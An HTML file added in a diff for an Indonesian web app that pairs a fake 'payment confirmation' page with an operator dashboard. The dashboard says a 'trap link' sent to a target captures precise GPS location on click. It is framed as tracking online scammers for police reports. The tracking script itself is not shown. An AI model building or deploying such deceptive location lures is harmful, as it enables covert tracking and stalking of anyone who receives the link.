@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="id" data-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verifikasi Pembayaran - Payment Confirmation</title>
+  <meta name="description" content="Sistem konfirmasi pembayaran online yang aman dan terverifikasi.">
+  
+  <!-- Leaflet CSS for Interactive Map -->
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" crossorigin="" />
+  
+  <!-- Main Stylesheet -->
+  <link rel="stylesheet" href="index.css">
+</head>
+<body>
+
+  <!-- ==================== HEADER (HANYA MUNCUL DI MODE USER 2 / TRACKER) ==================== -->
+  <header id="app-navbar" class="app-header" style="display: none;">
+    <div class="logo-section">
+      <div class="logo-icon">🛡️</div>
+      <div class="logo-text">
+        <h1>Cyber Tracker - Police Assistance</h1>
+        <p>Sistem Pelacakan Lokasi Penipu Online &amp; Generator Laporan</p>
+      </div>
+    </div>
+
+    <!-- Mode Switcher Pill -->
+    <div class="mode-switcher">
+      <button id="btn-mode-pay" class="mode-btn" onclick="switchMode('pay')">
+        <span>👁️ Pratinjau Halaman Target (User 1)</span>
+      </button>
+      <button id="btn-mode-tracker" class="mode-btn active active-receiver" onclick="switchMode('tracker')">
+        <span>📡 Radar Pelacak Penipu (User 2)</span>
+      </button>
+    </div>
+
+    <!-- Right Controls: Room ID & Theme/Sound Toggle -->
+    <div class="header-actions">
+      <div class="room-widget" title="Kode Ruang Sesi Investigasi">
+        <span id="room-status-dot" class="room-status-dot"></span>
+        <span class="room-label">KODE SESI:</span>
+        <input type="text" id="room-id-input" class="room-input" value="LOC-8821" maxlength="10" onchange="changeRoomId(this.value)">
+      </div>
+      <button id="btn-copy-link" class="btn-icon" title="Salin Link Halaman Konfirmasi Pembayaran untuk Target" onclick="copyTrapLink()">
+        🔗
+      </button>
+      <button id="btn-toggle-sound" class="btn-icon" title="Aktifkan/Nonaktifkan Suara Notifikasi" onclick="toggleSound()">
+        🔊
+      </button>
+      <button id="btn-toggle-theme" class="btn-icon" title="Ganti Tema Dark/Light" onclick="toggleTheme()">
+        🌙
+      </button>
+    </div>
+  </header>
+
+  <!-- ==================== MAIN CONTENT ==================== -->
+  <main class="main-container">
+
+    <!-- =========================================================================
+         MODE 1: HALAMAN USER 1 (TARGET/PENIPU - KONFIRMASI PEMBAYARAN MURNI)
+         Tidak ada tampilan apa-apa kecuali tombol "Konfirmasi Pembayaran"
+         ========================================================================= -->
+    <section id="view-pay" class="section-view active">
+      <div class="payment-clean-container">
+        
+        <div class="payment-card">
+          <!-- Subtle Trusted Security Badge -->
+          <div class="payment-shield-icon">
+            <span>🔒</span>
+          </div>
+          
+          <h1 class="payment-title">Konfirmasi Pembayaran</h1>
+          <p class="payment-subtitle">
+            Silakan klik tombol di bawah ini untuk mengkonfirmasi dan memverifikasi status pembayaran pesanan Anda.
+          </p>
+
+          <!-- HANYA TOMBOL "KONFIRMASI PEMBAYARAN" DI SINI -->
+          <div class="payment-button-area">
+            <button id="btn-confirm-payment" class="btn-pay-action" onclick="handleConfirmPayment()">
+              <span id="btn-pay-spinner" class="spinner" style="display: none;"></span>
+              <span id="btn-pay-text">KONFIRMASI PEMBAYARAN</span>
+            </button>
+          </div>
+
+          <!-- Pesan pemrosesan (tersembunyi secara default, muncul setelah tombol diklik) -->
+          <div id="payment-status-message" class="payment-message-box" style="display: none;">
+            <div id="pay-msg-icon" class="msg-icon">✓</div>
+            <div class="msg-text-group">
+              <h4 id="pay-msg-title">Pembayaran Sedang Diverifikasi</h4>
+              <p id="pay-msg-desc">Sistem sedang memproses verifikasi transaksi Anda. Terima kasih.</p>
+            </div>
+          </div>
+
+          <div class="payment-secure-footer">
+            <span>🔒 256-Bit SSL Encrypted Verification</span>
+            <span>•</span>
+            <span>Verifikasi Otomatis</span>
+          </div>
+        </div>
+
+
+
+      </div>
+    </section>
+
+    <!-- =========================================================================
+         MODE 2: RADAR PELACAKAN PENIPU ONLINE & BUKTI LAPORAN POLISI (USER 2)
+         ========================================================================= -->
+    <section id="view-tracker" class="section-view">
+      
+      <!-- Top Tactical Banner -->
+      <div class="tactical-banner">
+        <div class="tactical-banner-info">
+          <span class="badge-police">🚨 BANTUAN LAPORAN POLISI &amp; CYBER CRIME</span>
+          <h3>Pusat Investigasi &amp; Pelacakan Lokasi Penipu Online</h3>
+          <p>
+            Kirimkan tautan <strong>"Konfirmasi Pembayaran"</strong> kepada target. Saat target mengklik tombol tersebut, koordinat GPS presisi tinggi dan jejak forensik digital akan langsung tercatat secara live di peta di bawah ini.
+          </p>
+        </div>
+        <div class="tactical-banner-actions">
+          <button class="btn-tactical-primary" onclick="copyTrapLink()">
+            🔗 Salin Link Jebakan (Kirim ke Target)
+          </button>
+          <button class="btn-tactical-secondary" onclick="simulateScammerClick()">
+            ⚡ Simulasi Klik Konfirmasi (Demo)
+          </button>
+        </div>
+      </div>
+
+      <div class="receiver-layout">
+
+        <!-- Left Column: Big Tactical Leaflet Map -->
+        <div class="card tracker-map-card">
+          <div class="map-toolbar">
+            <div class="card-title" style="margin-bottom: 0;">
+              <span>🗺️ Peta Pelacakan Live (GPS Coordinate Tracker)</span>
+            </div>
+            <div class="live-badge">
+              <span class="live-dot"></span>
+              <span>LIVE TRACKING ACTIVE</span>
+            </div>
+          </div>
+
+          <div class="map-canvas-container">
+            <div id="receiver-map"></div>
+          </div>
+
+          <!-- Quick Help Action below map -->
+          <div class="police-help-box">
+            <div class="police-help-text">
+              <h4>📞 Langkah Pelaporan ke Kantor Polisi / SPKT:</h4>
+              <p>1. Klik tombol <strong>"Salin Laporan Polisi"</strong> pada kartu bukti lokasi target di sebelah kanan.<br>
+                 2. Lampirkan teks hasil salinan beserta bukti screenshot peta koordinat ke laporan kepolisian / Siber Bareskrim.<br>
+                 3. Pihak kepolisian dapat langsung menggunakan koordinat GPS &amp; link Google Maps untuk penindakan TKP.</p>
+            </div>
+          </div>
+        </div>
+
+        <!-- Right Column: Evidence List & Police Report Generator -->
+        <div class="card">
+          <div class="feed-header">
+            <h3 class="card-title" style="margin-bottom: 0; font-size: 1.15rem;">
+              <span>📋 Bukti Lokasi &amp; Forensik Target</span>
+            </h3>
+            <span id="feed-counter-badge" class="feed-counter">0 BUKTI TKP</span>
+          </div>
+
+          <div id="locations-list" class="locations-list">
+            <!-- Empty State -->
+            <div id="feed-empty-state" class="empty-feed">
+              <div class="empty-feed-icon">🚨</div>
+              <h4>Belum Ada Data Masuk dari Target</h4>
+              <p style="margin-top: 0.5rem; font-size: 0.85rem;">
+                Kirimkan link <strong>Konfirmasi Pembayaran</strong> kepada penipu online. Ketika tombol diklik, koordinat &amp; alamat TKP akan langsung muncul di sini.
+              </p>
+            </div>
+          </div>
+
+          <div style="margin-top: 1.25rem; display: flex; justify-content: space-between; align-items: center;">
+            <button class="btn-secondary" style="flex: 0; padding: 0.6rem 1rem; font-size: 0.8rem;" onclick="copyTrapLink()">
+              🔗 Salin Link Jebakan
+            </button>
+            <button class="btn-secondary" style="flex: 0; padding: 0.6rem 1rem; font-size: 0.8rem; border-color: rgba(244,63,94,0.3); color: #f43f5e;" onclick="clearLocationHistory()">
+              🗑️ Hapus Semua Riwayat
+            </button>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+  </main>
+
+  <!-- Notification Toast Container -->
+  <div id="toast-container" class="toast-container"></div>
+
+  <!-- Police Report Modal -->
+  <div id="police-modal" class="modal-backdrop" style="display: none;">
+    <div class="modal-box">
+      <div class="modal-header">
+        <h3>📋 Format Laporan Kepolisian (Bukti Digital Forensik TKP)</h3>
+        <button class="btn-modal-close" onclick="closePoliceModal()">✕</button>
+      </div>
+      <div class="modal-body">
+        <p class="modal-guide">
+          Teks di bawah ini dibuat dalam format resmi pelaporan barang bukti koordinat lokasi dan forensik digital, siap disalin untuk dilampirkan ke laporan polisi / SPKT / Cyber Crime:
+        </p>
+        <textarea id="police-report-text" class="report-textarea" rows="12" readonly></textarea>
+      </div>
+      <div class="modal-footer">
+        <button class="btn-tactical-primary" onclick="copyPoliceReportText()">
+          📋 Salin Laporan ke Clipboard
+        </button>
+        <button class="btn-secondary" onclick="closePoliceModal()">
+          Tutup
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Leaflet JS Library -->
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=" crossorigin=""></script>
+  <!-- PeerJS WebRTC P2P Cloud Library -->
+  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+  <!-- Application Script -->
+  <script src="app.js"></script>
+</body>
+</html>
